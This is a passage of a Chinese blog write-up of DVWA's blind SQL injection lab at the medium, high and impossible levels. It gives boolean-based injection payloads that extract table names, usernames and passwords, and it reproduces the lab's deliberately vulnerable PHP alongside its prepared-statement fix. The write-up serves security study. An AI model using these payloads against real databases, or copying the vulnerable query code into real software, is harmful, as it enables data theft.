+<p><img src="/dvwa-blind/dvwa-blind/24.png" alt="tcp"><br>直接送到C语言程序<br><img src="/dvwa-blind/dvwa-blind/25.png" alt="tcp"><br>可知为dvwa</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;9 #</span><br></pre></td></tr></table></figure>
+<p>查询第一个表的字段为9然后查询字母</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p><img src="/dvwa-blind/dvwa-blind/26.png" alt="tcp"><br>继续查询第二个表<br><img src="/dvwa-blind/dvwa-blind/27.png" alt="tcp"><br>可知为users,继续查询users的字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select count(column_name) from information_schema.columns where table_name&#x3D;users)&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p><img src="/dvwa-blind/dvwa-blind/28.png" alt="tcp"><br>发现并没有，尝试把users换成16进制试一试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select count(column_name) from information_schema.columns where table_name&#x3D;0x7573657273)&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p><img src="/dvwa-blind/dvwa-blind/29.png" alt="tcp"><br>回显成功之后方法就和low级别一样<br>查询user</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr((select group_concat(user) from users limit 0,1),1,1))&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<p>查询password</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr((select group_concat(password) from users limit 0,1),1,1))&#x3D;1 #</span><br></pre></td></tr></table></figure>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string( <span class="variable">$id</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>mysql_real_escape_string( $id )<br>限制了命令中的符号，可以看出<br>$getid  = “SELECT first_name, last_name FROM users WHERE user_id = $id;”<br>使用的是数字型</p>
+<hr>
+
+<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p><img src="/dvwa-blind/dvwa-blind/30.png" alt="tcp"><br>我们来做high级别题目，上来先进行抓包<br><img src="/dvwa-blind/dvwa-blind/31.png" alt="tcp"><br>修改cookie<br><img src="/dvwa-blind/dvwa-blind/32.png" alt="tcp"><br>成功，剩下的就和low一样</p>
+<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>可以看到是字符型输入并且后面只回显一个结果，但是我们使用#给注释掉了，然后加入了sleep()使时间盲注变的不那么准确。</p>
+<hr>
+
+<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">            header( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p>
+
+      </div>
+      
+      
+      
+    </div>
+    
+
+    
+    
+    
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-blind"><span class="nav-number">1.</span> <span class="nav-text">SQL blind</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#low"><span class="nav-number">1.1.</span> <span class="nav-text">low</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.1.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medium"><span class="nav-number">1.2.</span> <span class="nav-text">medium</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#high"><span class="nav-number">1.3.</span> <span class="nav-text">high</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#impossible"><span class="nav-number">1.4.</span> <span class="nav-text">impossible</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ziyuexi</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ziyuexi</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
